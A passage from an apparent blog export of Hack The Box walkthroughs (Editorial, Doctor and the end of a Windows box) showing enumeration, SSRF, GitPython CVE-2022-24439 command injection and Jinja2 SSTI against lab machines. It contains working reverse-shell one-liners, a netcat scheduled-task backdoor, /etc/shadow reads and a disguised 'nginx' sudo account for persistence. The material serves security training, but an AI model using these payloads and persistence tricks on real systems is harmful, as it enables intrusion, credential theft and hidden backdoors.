username and password, created using Get-Credential (gui-prompt) or manually with the below (which I will use.) #1. Use secure sring to pass our password and store in the $pass var: $pass = convertto-securestring \u0026#39;BL00dstiLL3r#\u0026#39; -asplain -force #2. Pass our username: $username = \u0026#34;bloodstiller\u0026#34; #3. Pass username \u0026amp; password into one var $cred: $cred = New-Object System.Management.Automation.PSCredential ($username, $pass) #4. Run our Command passing it the \u0026#34;Credential $credential\u0026#34; arg + var: #Command: [command] -Credential $cred You might be tempted to try the below to simply read the file, however it won\u0026rsquo;t work.\ncat C:\\Users\\Administrator\\Desktop\\root.txt -Credential $cred The error occurs because the FileSystem provider in PowerShell does not support passing credentials directly when accessing files using commands like cat (alias for Get-Content). Instead I need to modify the command: Commands like Get-Content or cat directly interact with the file system in the current user\u0026rsquo;s context. The FileSystem provider does not support credentials for local file access. Simply specifying -Credential without creating a new session (or drive mapping) has no effect for these commands because local file access relies on the caller\u0026rsquo;s current security context. I can however read it another way by running a subscript as that user:\nInvoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { Get-Content -Path \u0026#34;C:\\Users\\Administrator\\Desktop\\root.txt\u0026#34;} Why this works: Invoke-Command: Spawns a session under the specified credentials. (the ones I provide) The command inside the -ScriptBlock executes in that session. Subcommand (e.g., Get-Content): Runs as if it were invoked directly by the impersonated user, bloodstiller. Can access files and resources that the current user cannot. In action:\nI can see I am the user Phoebe I run the command to read the file in the context of my admin user bloodstiller which is successful and returns the flag (as this user is part of the admin group.) I try and read it in the context of Phoebe which is denied due not sufficient permissions. +Note+: The blurred parts are just empty lines I included to make the output easier to read.\nI can then start a reverse shell in the context of the user bloodstiller.\nStart-Process powershell -Credential $cred -ArgumentList \u0026#39;-NoP -NonI -W Hidden -Exec Bypass -Command \u0026#34;\u0026amp; { $client = New-Object System.Net.Sockets.TCPClient(\\\u0026#34;10.10.14.80\\\u0026#34;,6666); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | % {0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String); $sendback2 = $sendback + \\\u0026#34;PS \\\u0026#34; + (pwd).Path + \\\u0026#34;\u0026gt; \\\u0026#34;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); }; $client.Close(); }\u0026#34;\u0026#39; I can see that the user is Phoebe, but I get our shell in the context of the user bloodstiller who is in the administrators group as I passed it our credentials via the credentialed object. 4. Persistence: Dumping Admin Hash with LaZagne.exe: I upload LaZagne.exe with a python webserver. I run it and dump the hashes on the system. I did try psexec however I could not find any valid shares running so this did not work. I have the hashes but cannot pass them, lets look at other options. Adding a Scheduled Task To Call Back Out to us: This is one of my favorite techniques as I can just set the task and whenever I want start our listener.\nschtasks /create /tn BkD00r /tr \u0026quot;C:\\xampp\\htdocs\\omrs\\images\\nc64.exe 10.10.14.80 4433 -e cmd\u0026quot; /sc minute /mo 1 /ru system\nCommand Breakdown: /sc minute: Specifies that the task should run every minute. /mo 1: Runs the task every 1 minute. /ru system: Runs the task with System privileges. /tr: Specifies the action to execute, in this case, running nc64.exe with the specified options. +Note+: This techniques runs every 1 minute and calls out to my attack machine. This means that even if I disconnect I can turn on my listener again and it will call back out to em. Shell Caught:\nAs I can see I caught the shell disconnected, started my listener again and was re-connected again. I now have two forms of persistence a user with admin privileges, albeit I need to follow the standard chain of web/reverse shell to then run commands in their context using a credentialed object or start our listener and get a system shell. Lessons Learned: What did I learn? I learned to just be persistent, again this is an easier box, but I was trying to rush it. Slow down and get it done properly. What silly mistakes did I make? I tried to cred stuff the voting page and not the admin page initially, really need to stop seeing two fields for user input and trying to ram creds in there. So I learned to slow down and read. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n",

        "tags": ["Linux","HTB","Hack The Box","SSRF","Git","CVE-2022-24439","API Security","Privilege Escalation","GitPython","Web Security",],
        "content": "Editorial Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Editorial How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -oA TCPbasicScan kali in HTB/BlogEntriesMade/Editorial/scans/nmap 🍣 main 🛤️ ×1 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:52:10 zsh ❯ nmap $box -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 11:52 GMT Nmap scan report for 10.129.206.26 Host is up (0.043s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.95 seconds Initial thoughts: SSH \u0026amp; Web. Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Editorial/scans/nmap 🍣 main 🛤️ ×1 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:52:18 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 11:52 GMT Nmap scan report for 10.129.206.26 Host is up (0.039s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA) |_ 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://editorial.htb No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=12/21%OT=22%CT=1%CU=33625%PV=Y%DS=2%DC=I%G=Y%TM=676 OS:6AC33%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A OS:)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53 OS:CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88 OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+ OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A OS:=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 35.24 seconds Findings: We can see the domain is editorial.htb. I add this to /etc/hosts Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026quot;editorial.htb\u0026quot; update_var machine \u0026quot;editorial\u0026quot; Updating /etc/hosts for DNS\nI update my /etc/hosts file: echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts Web 80: Web Enumeration via Burp Suite: When enumerating a website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Whatweb: Lets run \u0026ldquo;whatweb\u0026rdquo; to see if we can glean some further information: whatweb $box\nkali in HTB/BlogEntriesMade/Editorial/scans/nmap 🍣 main 🛤️ ×1 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:55:43 zsh ❯ whatweb $box http://10.129.206.26 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.206.26], RedirectLocation[http://editorial.htb], Title[301 Moved Permanently], nginx[1.18.0] http://editorial.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.206.26], Title[Editorial Tiempo Arriba], X-UA-Compatible[IE=edge], nginx[1.18.0] Nothing especially interesting, we can see the site is using HTML5, nginx 1.18.0 and bootstrap. Dirbusting the webserver using ffuf: I Perform some directory busting to see if there are any interesting directories: ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$domain/FUZZ -fc 403 -ic But there was only upload \u0026amp; about Visiting the web page: It\u0026rsquo;s always good to just manually click around and manually enumerate the pages available.\nIt appears to be a publishing website. Looking at the /about page we can see there is an email present submissions@tiempoarriba.htb\nLet\u0026rsquo;s keep track of this as it may come in use later. Enumerating the \u0026ldquo;Publish With Us\u0026rdquo; page for injection points: We can see that the \u0026ldquo;Publish With Us\u0026rdquo; allows us to uplaod a file as well as enter a url for the Cover. Lets test these injection points.\nI fill it with the following details to see the response:\nI setup a simple python webserver on my host and enter this address as the URL cover url to see if I can have the site actively call out to this address.\nI add a simple .php webshell\nI hit the \u0026ldquo;Preview\u0026rdquo; button.\nAs we can see it does in fact call out and connect to our server. Looking at the response for the request in burp we can see we are provided a url for a static/uploads folder and then a GUID of the uploaded file. We can also see that there is no file restrictions on the uploaded file. So we can pass our shell.php file. I navigate to the url but cannot access it: I pass the url with the GUID as the cover url \u0026amp; supply a command \u0026ldquo;whoami\u0026rdquo; to see if we can access it via SSRF and have our commands trigger but it does not work.\nFor the remaining fields I prefix with \u0026ldquo;test\u0026rdquo; and then the description of the field. (I do this as I want see how they are processed and possible rendered once I hit \u0026ldquo;Send Book Info\u0026rdquo;) Fuzzing for SSRF with ffuf: As we know the server will try and connect to an endpoint we can fuzz on localhost (127.0.01) for SSRF, by performing a port scan on the host. This will tell us if we can access any locally running services on the host and at the same time if SSRF is a viable path.\nI use the copy as curl command option in burp to copy my POST request:\n+Note+: I verified I could still enter a url without uploading a file and it reach out to my python server and it worked as expected. I create a port list to use:\nseq 1 65535 \u0026gt; Ports.txt I modify the curl command so it can be used with ffuf: adding the wordlist -w specifying the url -u adding the injection point: http://127.0.0.1:FUZZ Removing the newlines and making 1 line Proxying all traffic via burp -x http://127.0.0.1:8080 Remove size of 61 -fs 61 This can only be done once we have the initial response so we can then filter for the standard response. ffuf -w ~/Wordlists/45.06-CustomWordlists/Ports.txt -u \u0026#39;http://editorial.htb/upload-cover\u0026#39; -X $\u0026#39;POST\u0026#39; -H $\u0026#39;Host: editorial.htb\u0026#39; -H $\u0026#39;Content-Length: 315\u0026#39; -H $\u0026#39;Accept-Language: en-US,en;q=0.9\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#39; -H $\u0026#39;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAKLIgaiMMQNJmTJ6\u0026#39; -H $\u0026#39;Accept: */*\u0026#39; -H $\u0026#39;Origin: http://editorial.htb\u0026#39; -H $\u0026#39;Referer: http://editorial.htb/upload\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H $\u0026#39;Connection: keep-alive\u0026#39; -d $\u0026#39;------WebKitFormBoundaryAKLIgaiMMQNJmTJ6\\x0d\\x0aContent-Disposition: form-data; name=\\\u0026#34;bookurl\\\u0026#34;\\x0d\\x0a\\x0d\\x0ahttp://127.0.0.1:FUZZ\\x0d\\x0a------WebKitFormBoundaryAKLIgaiMMQNJmTJ6\\x0d\\x0aContent-Disposition: form-data; name=\\\u0026#34;bookfile\\\u0026#34;; filename=\\\u0026#34;\\\u0026#34;\\x0d\\x0aContent-Type: application/octet-stream\\x0d\\x0a\\x0d\\x0a\\x0d\\x0a------WebKitFormBoundaryAKLIgaiMMQNJmTJ6--\\x0d\\x0a\u0026#39; -x http://127.0.0.1:8080 -fs 61 I have added the image of the command below as I know sometimes the formatting of my site can lead to the code boxes running off of the page. (will fix, soz bbz)\nWe get a hit on port 5000:\nAbusing SSRF To Access Internal API Endpoints: I enter this IP into the url box and we can see we are given the static/upload/GUID response again:\nI enter the url into my browser and the file downloads. When I look at the file it looks to be API information in json format:\nLooking at the contents we can see it\u0026rsquo;s information on an API running on the 5000 endpoint:\nI load these endpoints into burp intruder and query each endpoint\n+Note+: I tried this but for some reason when I attempted to download the returned files it would always fail. Instead I manually queried the endpoint, quickly extracted the string and downloaded the file. There may be a time limit on the files uploaded potentially. Retrieving default credentials from the \u0026ldquo;authors\u0026rdquo; API endpoint: The endpoint http://127.0.0.1:5000/api/latest/metadata/messages/authors contained the following message which appears to be sent to new authors \u0026amp; it contained default creds: dev:dev080217_devAPI!@ 2. Foothold: Accessing the host by SSH as dev: I try these on the ssh service \u0026amp; they work:\nLets get our flag:\nEnumerating the host as dev: Running Linpeas: I transfer linpeas over using a simple python http server. On my attack host: On my host I navigate to where I have the linpeas.sh file stored. I run python -m http.server 9000 On the target I navigate to /tmp as it\u0026rsquo;s always world writable. I transfer the file using wget. wget http://10.10.14.80:9000/linpeas.sh Make it executable chmod +x linpeas.sh Run it ./linpeas.sh It finds nothing of note. Finding prod user password in git commits: Looking at our users home folder we can see they have an apps folder however it is empty.\nLooking further we can see it has a .git folder, meaning this was once at some point initialized as a git repo or was intended to be a git repo, which means either files have been deleted or never added. Luckily we can query the .git logs to check if files were ever present.\nI run git log --oneline and we are shown a list of previous commits, which means this was an active repo but the files have since been deleted. On the left hand side we can see the git commit hash and to the right the commit message supplied by the user for the commit.\nLooking at the commit messages we can see an interesting one \u0026ldquo;downgrading prod to dev\u0026rdquo;, now given we were able to retrieve clear text passwords from the API endpoint previously I would imagine we can find clear text creds for prod here too.\nI use git log -p b73481b to read the changes.\nLooking at the changes we can see the following. The text in red signifies it was deleted and the text in green signifies it was added \u0026amp; looking at the contents we can see it contains clear text creds for the prod account.\nprod:080217_Producti0n_2023!@ 3. Lateral Movement: Enumerating as prod: I su user to prod and it works.\nI check what sudo command\u0026rsquo;s prod can run if any:\nWe can see that we can run python3 as sudo and run the script /opt/internal_apps/clone_changes/clone_prod_change.py the fact the script is followed by the wildcard symbol * implies we can pass any arguments to this script and have it run as root Reading the contents of the script we can see it contains the following code:\n#!/usr/bin/python3 import o s import sys from git import Repo os.chdir(\u0026#39;/opt/internal_apps/clone_changes\u0026#39;) url_to_clone = sys.argv[1] r = Repo.init(\u0026#39;\u0026#39;, bare=True) r.clone_from(url_to_clone, \u0026#39;new_changes\u0026#39;, multi_options=[\u0026#34;-c protocol.ext.allow=always\u0026#34;]) This all looks pretty standard. We import OS, to interact with the operating system \u0026amp; sys to take cli args for the script. We then import Repo from Git. Code Breakdown and explanation of vulnerability: Imports and Setup:\nimport sys from git import Repo import os sys: Used to access command-line arguments. git.Repo: From the GitPython library, allows interaction with Git repositories. os: Used to interact with the host os. Change Working Directory:\nos.chdir(\u0026#39;/opt/internal_apps/clone_changes\u0026#39;) Changes the current working directory to /opt/internal_apps/clone_changes. This ensures that subsequent operations (e.g., creating or cloning repositories) occur in this directory. Command-Line Argument Handling:\nurl_to_clone = sys.argv[1] sys.argv[1]: Takes the first command-line argument after the script name as the URL of the repository to be cloned. Initialize Bare Git Repository:\nr = Repo.init(\u0026#39;\u0026#39;, bare=True) Repo.init('', bare=True): Initializes a new bare Git repository in the current directory (\u0026rsquo;\u0026rsquo; refers to the current path). A bare repository has no working tree and is typically used as a remote/shared repository. Clone a Repository:\nr.clone_from(url_to_clone, \u0026#39;new_changes\u0026#39;, multi_options=[\u0026#34;-c protocol.ext.allow=always\u0026#34;]) r.clone_from(url_to_clone, 'new_changes'): Clones the repository from url_to_clone into a directory named new_changes within the current working directory. multi_options=[\u0026quot;-c protocol.ext.allow=always\u0026quot;]: Adds a Git configuration option: -c protocol.ext.allow=always: Allows the protocol.ext transport, enabling custom protocol handlers. What does that mean in english? Here\u0026rsquo;s a simpler explanation: For the most part the script is very simple, it takes a supplied git repo as an argument and will clone it into a directory called new_changes with the current working directory. However the temporary addition being added is an issue as it allows us to execute code on the host.\nWhat does multi_options=[\u0026quot;-c protocol.ext.allow=always\u0026quot;] do? It adds a temporary configuration to the Git command being run by the script. What is protocol.ext? It\u0026rsquo;s a Git feature that allows you to define custom commands or handlers for specific types of repository URLs. What does -c protocol.ext.allow=always mean? It tells Git: \u0026ldquo;It\u0026rsquo;s okay to run custom commands whenever a repository URL starts with ext::.\u0026rdquo; Why is this important? Normally, Git disables this feature because it can be dangerous. Because it allows us to provide an argument like the below and have it execute on the host system. And as we are allowed to execute this script as root our commands will run as root! e.g. ext::sh -c 'cat //root//.ssh/id_rsa' If we google \u0026ldquo;GitPython rce\u0026rdquo; we find CVE-2022-24439 . 4. Privilege Escalation: Using CVE-2022-24439 GitPython Vulnerability to get a root shell. Initially I check if nc is installed and it is however it has been compiled without the -c or -e flags so we cannot use it for reverse shell.\nThis means we will need to use a bash shell. I run the following command to create a bash shell in the /tmp/ folder:\necho \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.80/80 0\u0026gt;\u0026amp;1\u0026quot; \u0026gt;\u0026gt; /tmp/notashell.sh I start my listener:\nrlwrap -cAr nc -nvlp 80 Run the python script whilst passing the shell as an argument:\nsudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py \u0026#39;ext::sh -c bash% /tmp/notashell.sh\u0026#39; Get our root flag:\nWhy do we need the % sign after bash: So this was annoying me for sometime and I looked into it, every-time there is a space we need to supply the % to escape due to how argv handles special characters.\nFor instance we can read /etc/shadow by copying it to /tmp/shad by doing this:\nsudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py \u0026#39;ext::sh -c cat% /etc/shadow% \u0026gt;\u0026gt;% /tmp/shad\u0026#39; We can then see if we navigate to /tmp we can read the file. This means any command can be run provided any spaces are followed by % symbol. Read the root flag this way:\nsudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py \u0026#39;ext::sh -c cat% /root/root.txt% \u0026gt;\u0026gt;% /tmp/root.flag\u0026#39; 5. Persistence: Creating a high privileged \u0026ldquo;service\u0026rdquo; account for persistence: I create an account called \u0026ldquo;nginx\u0026rdquo; and give myself root privileges \u0026amp; access to the bash shell. I use this name as it\u0026rsquo;s one you could see on a machine and will raise less suspicion.\nsudo useradd -m -s /bin/bash nginx\nCreates a new user named nginx. -m: Creates a home directory for the user. -s /bin/bash: Sets the user\u0026rsquo;s default shell to /bin/bash. sudo usermod -aG sudo nginx\nAdds the nginx user to the sudo group. -a: Appends the user to the group (avoids overwriting existing groups). -G sudo: Specifies the sudo group. sudo passwd nginx\nSets or updates the password for the nginx user. Prompts us to add a new password and confirms it. I switch to the newly created user\nI check we have sudo privileges, as expected we do.\nI ensure we can actually read sudo level files by reading /etc/shadow\nLessons Learned: What did I learn? I learned about retrieving data from git logs. I learned about the python git vulnerability CVE-2022-24439: What silly mistakes did I make? Oh I did not use a forward slash at one point in a command and that was stumping reading the API endpoints at one point, that was fun. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

        "tags": ["Linux","HTB","Hack The Box","SSTI","Splunk","Web Security","Template Injection","Log Analysis","Privilege Escalation","Persistence",],
        "content": "Doctor Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Doctor How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan 🕙 13:37:21 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 13:37 GMT Nmap scan report for 10.129.2.21 Host is up (0.041s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8089/tcp open unknown Initial thoughts: SSH, HTTP and what could be Splunk running on 8089. Comprehensive Scans: In depth scan TCP: sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 13:38 GMT Nmap scan report for 10.129.2.21 Host is up (0.038s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA) | 256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA) |_ 256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Doctor 8089/tcp open ssl/http Splunkd httpd |_http-title: Splunkd | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Not valid before: 2020-09-06T15:57:27 |_Not valid after: 2023-09-06T15:57:27 |_http-server-header: Splunkd | http-robots.txt: 1 disallowed entry |_/ Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|specialized Running (JUST GUESSING): Linux 5.X|4.X|2.6.X (95%), Crestron 2-Series (86%) OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:crestron:2_series Aggressive OS guesses: Linux 5.0 (95%), Linux 4.15 - 5.8 (90%), Linux 5.0 - 5.4 (90%), Linux 5.3 - 5.4 (89%), Linux 2.6.32 (89%), Linux 5.0 - 5.5 (88%), Crestron XPanel control system (86%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 172.25 seconds Findings: System is running apache \u0026amp; ubuntu. Interestingly it\u0026rsquo;s running Splunk, which is a log analytics tool used to gather, analyze and visualize data, Splunk is often used for security monitoring and business analytics. What is also good is I know it\u0026rsquo;s possible to get RCE via Splunk if we can get access to the console, also splunk is often running with elevated privileges as it\u0026rsquo;s dealing with system logs. This could be a viable privesc path if we can get access. Splunk: 8089: This is a great resources which shows Splunk\u0026rsquo;s default ports and what they are used for:\nAs we can see it\u0026rsquo;s most likely a management or API port: I try and connect but the page will not load. I also try curling but the connection is continually reset by the host. I am going to restart the host as this in my experience, is not intended behavior from the Splunk Universal Forwarder.\nSplunk Universal Forwarder Primer: Whilst we wait on the box resetting here is a primer on the Splunk universal forwarder and what it does.\nThink of the Universal Forwarder as Splunk\u0026rsquo;s specialized data courier - a stripped-down version of Splunk Enterprise that\u0026rsquo;s been optimized getting log data from point A to point B, as quickly as possible.\nBy eliminating non-essential components like the UI and Python interpreter, it achieves remarkable performance with minimal system footprint.\nStrategic limitations:\nThe UF\u0026rsquo;s limitations are actually strategic design choices. These constraints ensure maximum reliability and minimal attack surface - crucial for security-focused deployments. No data parsing capabilities (raw data forwarding only) Absence of UI and Python support Limited local filtering options Security Features:\nSSL/TLS encryption for data in transit Configurable authentication mechanisms Queue persistence during network outages Robust metadata tagging for forensic integrity The UF shines in several security-critical scenarios:\nEnterprise-wide endpoint telemetry collection Real-time security log aggregation Compliance data gathering Network traffic monitoring Enumerating Splunk: After the reset I can view the page as expected and it appears it is the Universal Forwarder.\nI check all links and two are requesting login credentials serviceNS \u0026amp; service\nI run some very basic cred stuffing, admin:admin, root:root etc, but none grant access.\nI know that it is possible to privesc using the universal forwarder as I have read these article\u0026rsquo;s Airman\u0026rsquo;s article \u0026amp; Clement Notin\u0026rsquo;s article before however credentials are required so let\u0026rsquo;s put a pin in this.\nWeb 80: Web Enumeration via Burp Suite: When enumerating a website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Initial Enumeration: Browsing to the site we can see it has the domain listed as doctors.htb in an email address. I will add this to my /etc/hosts file for easy scanning Enumerating doctors.htb After adding doctors.htb to my hosts file I navigate to the page and fine a Secure Messaging Service I add some test data as to it\u0026rsquo;s response. I get the response: \u0026ldquo;Nope, no such luck\u0026rdquo; I create a new account following the signup process: Finding /archive in the html of the homepage Looking at the source code of the /home page once logged in we can see the following hmtl comment.\nI navigate to /archive however it appears to be a blank page\nHowever if we look at the source-code we can see there is xml content I create a test post\nAnd when I look back in the archive I can see it\u0026rsquo;s listed as an item.\nAs we can see it\u0026rsquo;s pulling the title through in the title tags. Which means it may be vulnerable to SSTI. Fuzzing for SSTI and discovering the template engine. The table below shows what the input and the correct responses should be and then how we should progress. There is a handy flow chart that corresponds to this on payload all the things: Payload Path Taken Template Engine Result Response/Output ${7*7} Direct Input Smarty ✅ Vulnerable 49 Mako ❓ Unknown Unknown a{*comment*}b Comment Handling Input Smarty ✅ Vulnerable ab ${\u0026quot;\u0026quot;.join(\u0026quot;ab\u0026quot;)} Join Function Injection Smarty ✅ Vulnerable ab Mako ✅ Vulnerable ab Jinja2 ❓ Unknown Unknown {{7*7}} Double Braces Input Jinja2 ✅ Vulnerable 49 Twig ✅ Vulnerable 49 Unknown ❓ Unknown Unknown {{7*'7'}} String Multiplication Attempt Jinja2 ✅ Vulnerable 7777777 Twig ✅ Vulnerable 49 Same content as a list for fuzzing: ${7*7} a{*comment*}b ${\u0026#34;\u0026#34;.join(\u0026#34;ab\u0026#34;)} {{7*7}} {{7*\u0026#39;7\u0026#39;}} I capture a POST request in burp for the creation of a new pose and send to intruder. I then select my injection point and load my payload list.\n+Note+: You want to ensure that URL encoding is OFF. I then request the archive again and see the following:\nIf we cross-reference that with the image \u0026amp; table I have above we can see that the only payloads that were processed were the final two {{7*7}} \u0026amp; {{7*'7'}} and given their responses, 49 for payload 1 and 7777777 for payload 2 we know that this template engine is jinja2. RCE POC: Even though the above does prove RCE I want to verify this further.\nI create a new post with the following content as if we have RCE the /etc/passwd file is world readable so can confirm.\n{{ self.__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /etc/passwd\u0026#39;).read() }} I save it then navigate to /archive in order for the SSTI template engine to process the payload. We have RCE, let\u0026rsquo;s get a shell. 2. Foothold: Getting a reverse shell via SSTI: I repeat the same process with this payload: {% for x in ().__class__.__base__.__subclasses__() %}{% if \u0026#34;warning\u0026#34; in x.__name__%}{{x()._module.__builtins__[\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.80/9967 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;).read()}}{%endif%}{%endfor%} Reverse shell caught:\nExploit/Reverse Shell Breakdown: The payload:\n{% for x in ().__class__.__base__.__subclasses__() %} {% if \u0026#34;warning\u0026#34; in x.__name__ %} {{x()._module.__builtins__[\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.80/9967 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;).read()}} {% endif %} {% endfor %} Step-by-step Analysis\nTraversal of Python Classes:\n().__class__ retrieves the class of an empty tuple (e.g., \u0026lt;class 'tuple'\u0026gt;). ().__class__.__base__ accesses the base class of tuple, which is \u0026lt;class 'object'\u0026gt;. ().__class__.__base__.__subclasses__() enumerates all subclasses of the base object class. Purpose: This enables us to traverse the entire Python object hierarchy, including 